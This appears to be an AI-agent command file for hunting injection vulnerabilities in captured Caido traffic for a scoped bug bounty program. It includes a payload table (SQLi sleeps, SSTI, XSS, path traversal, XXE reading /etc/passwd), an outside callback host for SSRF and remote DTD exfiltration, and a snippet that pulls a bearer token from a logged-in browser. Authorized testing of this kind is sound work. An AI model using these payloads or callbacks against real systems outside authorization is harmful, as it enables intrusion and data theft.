---
description: Hunt vulnerabilities across the Caido HTTP history from a given date/time, scoped to a program. Passive/interactive (driven via the Caido MCP), not the hunt.py scanner. Enumerates each request's params by type and PROVES each injection class per Critical Rule 7. Usage: /hunt-caido "2026-08-05 16:50" [--scope <name>] [--classes sqli,ssti,xxe,ssrf,redirect,lfi,rce,xss]
---

# /hunt-caido

Hunt the **already-captured Caido HTTP history** — not a live domain. Reads the program scope, pulls every in-scope request after a cutoff datetime, and tests each one per **Critical Rule 7 (INJEÇÃO — PROVAR, NUNCA ASSUMIR)**.

This is a **methodology command driven through the Caido MCP** (`mcp__caido__*`) + Chrome MCP for render verification. It does **not** call `tools/hunt.py` / `vuln_scanner.sh` — those only know live domains and can't read Caido.

## Usage

```
/hunt-caido "2026-08-05 16:50"                                  (all classes, active Caido scope)
/hunt-caido "2026-08-05 16:50" --scope Tradeshift               (pin the scope by name)
/hunt-caido "2026-08-05 16:50" --classes sqli,ssti,rce,xxe      (subset)
/hunt-caido "2026-08-05 16:50" --tz -03                         (interpret the datetime in this offset; default: America/Sao_Paulo)
```

Datetime is interpreted in the operator's local offset (default `-03`) unless `--tz` is given.

---

## Step 1 — Resolve scope (never test out-of-scope)

1. `mcp__caido__caido_list_scopes`. Pick the scope named by `--scope`, else infer from context / ask.
2. Note **allowlist AND denylist** — e.g. Tradeshift allows `*.tradeshift.com` but **denies** `go.` / `api.tradeshift.com`. Real traffic usually lands on `api-sandbox.tradeshift.com` + `sandbox.tradeshift.com`.
3. For any host you're unsure about, confirm with `mcp__caido__caido_is_in_scope`.

## Step 2 — Find the cutoff request-id (date → ID bisection)

The HTTPQL date filter does **not** work (`req.created.gt` is rejected). Convert the datetime to a boundary and find the first request-id at/after it by bisection:

1. Convert the cutoff to unix / UTC:
   ```bash
   TZ=America/Sao_Paulo date -j -f "%Y-%m-%d %H:%M:%S" "2026-08-05 16:50:00" +%s
   ```
2. Request-ids are globally sequential in time. Probe `caido_get_request` (metadata only — it returns `createdAt`) on candidate ids, bisecting between a known-early and known-late id until you bracket the cutoff. `request not found` on high ids ⇒ you passed the max id; walk back down.
3. Result: the first in-window request-id. Build a pagination cursor for it:
   ```bash
   printf '{"id":"<ID>","order_value":null}' | base64   # → pass as `after`
   ```

## Step 3 — List in-scope, in-window requests and strip noise

`mcp__caido__caido_list_requests` with `after:<cursor>` and an HTTPQL host filter. Filter out non-signal:

```
req.host.cont:"<scope-token>" and req.host.ncont:"analytics"
  and req.path.ncont:"accesstoken" and req.path.ncont:"login/state"
```

Then, from the results, drop: `OPTIONS` preflights, static assets (`.js/.svg/.png/.css`), websocket upgrades, telemetry beacons. Keep anything with **parameters or a body** (GET with query, POST/PUT/DELETE with body). Verify each kept request's `createdAt` is actually ≥ cutoff (the cursor id is approximate).

> **⚠️ MANDATORY — paginate to exhaustion, and prove it.** `list_requests` returns **20 per page (max 100), paginated via `nextCursor` + `hasMore`**. You MUST loop the cursor until `hasMore:false` — one page is NOT the window. **Count the total in-window requests and the kept-after-noise count, and state both numbers** at the start of Step 4 (e.g. "window = 214 requests, 37 kept"). If you can't state the count, you didn't enumerate the window and any "negative" is invalid. This is a primary miss mode — a request that sat on page 3 is a request you never tested.

> **⚠️ The list shows ONLY `id / method / url / status` — NEVER the body.** A `POST` whose URL looks like innocent app-load noise (e.g. `decorate-connections?limit=10&offset=0`) can carry an injectable free-text field in its JSON body. **Judging a request by its URL is not triage — it is the exact "looks like normal traffic" trap Rule 7 forbids.** For every kept `POST/PUT/PATCH/DELETE`, you MUST pull the body (Step 4) before deciding it's out of scope for a class. Reading the URL ≠ enumerating the parameters.

## Step 4 — Per request, PROVE each class (Critical Rule 7)

**First, fetch the full request** — `mcp__caido__caido_get_request` with `include: [requestHeaders, requestBody]` (and `responseBody` for the baseline). The list output does not contain the body; you cannot enumerate params without this call. Do it for **every** kept request, no exceptions — a POST with an empty-looking URL is where the sinks hide.

Then enumerate **every parameter** (query, path segment, **every body field, however deeply nested** — `Filters[].Arguments[].Value` counts), custom header, and its **expected type**, and attack by type. **Always replay server-side with `mcp__caido__caido_send_request` using a FRESH token** — the browser `fetch` to `api-sandbox` returns a spurious `405 "supported methods: OPTIONS"`.

> Note: `/v4/apps/...` routes on `sandbox.tradeshift.com` are the web-app proxy and need the **session Cookie (`JSESSIONID` + `csrfToken`) AND the Bearer** — Bearer alone returns a `404` login shell (`window.TS_LOGGED_IN = false`). Confirm the baseline returns real data (200 + expected JSON) before trusting any negative.

Fresh token (Tradeshift, ~minutes TTL): in the logged-in Chrome tab
```js
JSON.parse(await fetch('/v4/accesstoken',{credentials:'include'}).then(r=>r.text())).accessToken  // already includes "Bearer "
```

| Param type | What to send | Positive signal |
|---|---|---|
| **free-text** (`q`, `name`, `label`, `value`, note bodies) | SQLi: `'` `"` `' OR '1'='1` `'||pg_sleep(5)--` `' AND SLEEP(5)--` `'; WAITFOR DELAY '0:0:5'--` · SSTI: `${7*7}` `{{7*7}}` `#{7*7}` `<%=7*7%>` · reflected XSS: `'"><svg onerror=alert(1)>` | SQLi: error leak, boolean diff, or **+5s** in `roundtripMs` · SSTI: response contains `49` · XSS: payload reflected **raw** in an HTML-context (`text/html`) response |
| **UUID** (`targetCompanyId`, `{id}` paths) | `<uuid>'`, `<uuid>'||pg_sleep(5)--` | Injection is **unreachable** if it 400s on UUID parse before the query — record `400` as proof of negative |
| **enum** (`visibility`, `state`, `type`) | `<val>'`, `${7*7}`, a bogus member | `400 "No enum constant …"` = validated (negative). `${7*7}` echoed literally = **no SSTI** |
| **int** (`page`, `limit`, `offset`) | `0'`, `0 AND pg_sleep(5)--`, `-1`, `99999999` | `400 "For input string"` = `Integer.parseInt` before DB (negative). No delay = no time-based |
| **URL/redirect** (`url`, `website`, `redirect_url`, `next`) | OOB callback `https://myliberty.com.br/post.php?probe=<nonce>` + open-redirect payloads (`//evil`, `/\evil`, `https:evil`) | SSRF: server-side callout to the nonce (check the OOB log) · redirect: `3xx` `Location` to attacker host |
| **XML body** (invoice / SOAP / config) | XXE `file:///etc/passwd` in-band + OOB DTD (`myliberty.com.br/xxe/remote_lfi.dtd`) | file contents reflected, or OOB DTD callout |
| **file path** (`file`, `path`, `avatar`, `template`) | `../../../../etc/passwd`, encoded `..%2f`, LFI wrappers | file contents / traversal escape |

For **writes that store attacker text** (stored/reflected XSS candidates): confirm the write persisted, then **verify the render in Chrome** (`mcp__claude-in-chrome__*`) — load the view that displays the value, inspect the DOM for injected live nodes vs escaped text (`&lt;script&gt;`). Persistence ≠ execution; only a render check decides it.

## Step 5 — Report per class, with evidence

For each class, state the verdict with the **request evidence in hand** — status + body snippet + timing (and the trace-id / request-id). Never write "absent" / "not applicable" without that line. Group by class; most-severe first.

- Log confirmed findings to the lead board (`tools/lead_board.py`) and route to the matching `hunt-*` skill.
- Note pollution created (test notes/locations/properties) so it can be cleaned.
- If a finding is confirmed → `/validate` → `/report`.

## Anti-patterns (do NOT do these)

1. **Declaring a class "absent" with no requests sent.** If you didn't send the payloads and read the responses, you didn't test it. That is the exact failure Critical Rule 7 exists to prevent.

2. **Skipping a request because its URL looks like page-load noise.** Real miss (05/08/2026): `POST decorate-connections?limit=10&offset=0` was dismissed as "NetworkManager loading" and never opened. Its JSON body held a free-text `Filters[].Arguments[].Value` search field — a live SQLi/SSTI sink. It only got tested when the operator pasted it by hand. **The URL tells you nothing about the body. Open every POST/PUT/PATCH.**

3. **Stopping at the first page of `list_requests`.** The window is every page up to `hasMore:false`, not the first 20. A request you never listed is a request you never tested — and you won't even know it exists.

See memory `feedback-param-injection-method` and `tradeshift-decorate-connections-negative`.
